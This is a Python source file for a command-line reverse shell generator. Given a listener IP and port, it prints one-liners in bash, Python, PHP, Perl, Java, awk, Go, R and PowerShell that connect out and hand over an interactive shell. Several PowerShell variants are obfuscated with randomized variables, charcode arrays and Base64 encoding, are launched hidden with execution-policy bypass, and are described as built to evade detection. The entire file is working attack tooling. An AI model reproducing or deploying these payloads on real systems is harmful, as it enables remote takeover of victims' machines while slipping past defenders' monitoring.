import argparse
import base64
import random
import string

def random_var(length=12):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_obfuscated_reverse_shell(ip, port):
    v_tcpclient = random_var()
    v_stream = random_var()
    v_bytes = random_var()
    v_read = random_var()
    v_data = random_var()
    v_sendback = random_var()
    v_sendback2 = random_var()
    v_sendbyte = random_var()

    code = f"""
    ${v_tcpclient} = New-Object Net.Sockets.TCPClient("{ip}",{port});
    ${v_stream} = ${v_tcpclient}.GetStream();
    [byte[]]${v_bytes} = 0..65535|%{{0}};
    while((${v_read} = ${v_stream}.Read(${v_bytes}, 0, ${v_bytes}.Length)) -ne 0) {{
        ${v_data} = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(${v_bytes},0,${v_read});
        ${v_sendback} = (iex ${v_data} 2>&1 | Out-String );
        ${v_sendback2} = ${v_sendback} + 'PS ' + (Get-Location).Path + '> ';
        ${v_sendbyte} = ([text.encoding]::ASCII).GetBytes(${v_sendback2});
        ${v_stream}.Write(${v_sendbyte},0,${v_sendbyte}.Length);
        ${v_stream}.Flush()
    }};
    ${v_tcpclient}.Close()
    """.strip().replace('\n', ';')

    return base64.b64encode(code.encode('utf-16le')).decode()

def get_obfuscated2_code(ip, port):
    def str_to_charcode_array(s):
        return ",".join(str(ord(c)) for c in s)

    tcpclient_code = f"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});"
    stream_code = "$s=$c.GetStream();"
    byte_code = "[byte[]]$b=0..65535|%{0};"
    loop_code = ("while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
                 "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
                 "$r=(iex $d 2>&1 | Out-String);"
                 "$r2=$r+'PS '+(Get-Location).Path+'> ';"
                 "$sb=([Text.Encoding]::ASCII).GetBytes($r2);"
                 "$s.Write($sb,0,$sb.Length);$s.Flush()};"
                 "$c.Close()")

    full_code = tcpclient_code + stream_code + byte_code + loop_code
    char_array = str_to_charcode_array(full_code)

    obfuscated = (
        f"$p=({char_array}) -join ',';"
        f"$s=[System.Text.Encoding]::ASCII.GetString(($p -split ',' | %{{[byte]$_}}));"
        f"iex $s"
    )
    return obfuscated

def generate_powershell_base64(ip, port):
    payload_code = (
        "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
        "$stream = $client.GetStream();"
        "[byte[]]$bytes = 0..65535|%{{0}};"
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
        "$sendback = (iex $data 2>&1 | Out-String );"
        "$sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ';"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);"
        "$stream.Flush()}};"
        "$client.Close()"
    ).format(ip=ip, port=port)
    return base64.b64encode(payload_code.encode('utf-16le')).decode()

def colorize(text, color):
    colors = {
        'red': '\033[91m', 'green': '\033[92m', 'yellow': '\033[93m',
        'blue': '\033[94m', 'magenta': '\033[95m', 'cyan': '\033[96m',
        'white': '\033[97m', 'reset': '\033[0m'
    }
    return f"{colors.get(color, colors['reset'])}{text}{colors['reset']}"

def display_shell_types():
    for shell_type, shell_info in shells.items():
        print(colorize(f"{shell_type}:", 'blue'))
        print(colorize(f"{shell_info['description']}\n", 'green'))

shells = {
    "bash": {
        "command": "bash -c 'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'",
        "description": "Bash reverse shell using TCP sockets and file descriptors (Linux/Unix)"
    },
    "python-linux": {
        "command": "python -c 'import socket,subprocess,os;"
                   "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                   "s.connect((\"{ip}\",{port}));"
                   "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
                   "subprocess.call([\"/bin/sh\",\"-i\"])'",
        "description": "Python reverse shell for Linux using the socket and subprocess modules"
    },
    "python-windows": {
        "command": "python.exe -c \"import socket,os,subprocess as sp;"
                   "s=socket.socket();s.connect(('{ip}',{port}));"
                   "p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.PIPE);"
                   "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                   "[os.write(p.stdin.fileno(),i) for i in iter(lambda: s.recv(1024), b'')]\"",
        "description": "Python reverse shell for Windows using socket and subprocess with full stdin/stdout redirection"
    },
    "php-linux": {
        "command": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "description": "PHP reverse shell for Linux using fsockopen and /bin/sh"
    },
    "php-windows": {
        "command": "php -r \"$sock=fsockopen(\\\"{ip}\\\",{port});"
                   "$proc=proc_open(\\\"cmd.exe\\\", [[0, $sock],[1, $sock],[2, $sock]], $pipes);\"",
        "description": "PHP reverse shell for Windows using fsockopen and proc_open with cmd.exe"
    },
    "perl": {
        "command": "perl -e 'use Socket;$i=\"{ip}\";$p={port};"
                   "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                   "if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");"
                   "open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "description": "Perl reverse shell leveraging low-level socket functions to execute /bin/sh"
    },
    "java": {
        "command": "r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};"
                   "cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[]);p.waitFor();",
        "description": "Java reverse shell spawning a bash process through Runtime.exec (must be embedded in a Java class)"
    },
    "awk": {
        "command": "awk 'BEGIN {{s=\"/inet/tcp/0/{ip}/{port}\";while(42){{do{{printf \"> \"|&s;"
                   "s|&getline c;if(c){{while((c|&getline)>0)print $0|&s}}}} while(c!=\"exit\")"
                   "close(s);}}}}'",
        "description": "Awk reverse shell using TCP socket and interactive loop to execute commands"
    },
        "go": {
        "command": "echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/a.go && go run /tmp/a.go && rm /tmp/a.go",
        "description": "Go reverse shell: Uses Golang to compile and run a reverse shell. Requires Go to be installed "
                       "on the target system. Useful for quickly creating executable reverse shells."
    },
    "r": {
        "command": "R -e 'system(\"bash -i >& /dev/tcp/{ip}/{port} 0>&1\")'",
        "description": "R reverse shell executing bash through a system() call (Linux)"
    },
    "powershell1": {
        "command": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \""
                   "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
                   "$stream = $client.GetStream();"
                   "[byte[]]$bytes = 0..65535|%{{0}};"
                   "while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{"
                   "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
                   "$sendback = (iex $data 2>&1 | Out-String);"
                   "$sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ';"
                   "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
                   "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
        "description": "Classic PowerShell reverse shell using New-Object and GetStream to establish a TCP connection"
    },
    "powershell2": {
        "command": "powershell -Command \"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});"
                   "$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
                   "while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
                   "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
                   "$r=(iex $d 2>&1 | Out-String);$r2=$r+'PS '+(Get-Location).Path+'> ';"
                   "$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()\"",
        "description": "Compact version of PowerShell reverse shell with shorter syntax and same logic"
    },
    "powershell3": {
        "command": "powershell -nop -w hidden -noni -ep bypass -enc {payload}",
        "description": "PowerShell reverse shell encoded in Base64 (UTF-16LE) to bypass command-line detection"
    },
    "powershell-obf": {
        "command": "powershell -w hidden -enc {payload}",
        "description": "PowerShell reverse shell with randomized variables + Base64 encoding to evade detection"
    },
    "powershell-obf2": {
        "description": "Heavily obfuscated PowerShell reverse shell using charcode array and decoding at runtime, then Base64 encoded for stealth",
        "command": "powershell -nop -w hidden -noni -ep bypass -enc {payload}"
    }
}

def main():
    parser = argparse.ArgumentParser(description='Generate reverse shell scripts.')
    parser.add_argument('--ip', type=str, required=True, help='IP address of the listener.')
    parser.add_argument('--port', type=int, required=True, help='Port of the listener.')
    parser.add_argument('--type', type=str, choices=shells.keys(), required=True, help='Type of reverse shell.')
    parser.add_argument('--list-shells', action='store_true', help='List all shell types.')

    args = parser.parse_args()

    if args.list_shells:
        display_shell_types()
        return

    if args.type == "powershell-obf":
        payload = generate_obfuscated_reverse_shell(args.ip, args.port)
        shell_code = shells[args.type]['command'].format(payload=payload)
    elif args.type == "powershell3":
        payload = generate_powershell_base64(args.ip, args.port)
        shell_code = shells[args.type]['command'].format(payload=payload)
    elif args.type == "powershell-obf2":
        raw = get_obfuscated2_code(args.ip, args.port)
        payload = base64.b64encode(raw.encode("utf-16le")).decode()
        shell_code = shells[args.type]['command'].format(payload=payload)
    else:
        shell_code = shells[args.type]['command'].format(ip=args.ip, port=args.port)

    print(colorize(f"Reverse Shell Type: {args.type}", 'magenta'))
    print(colorize("Shell Code:\n", 'cyan'))
    print(colorize(shell_code, 'yellow'))

if __name__ == '__main__':
    main()
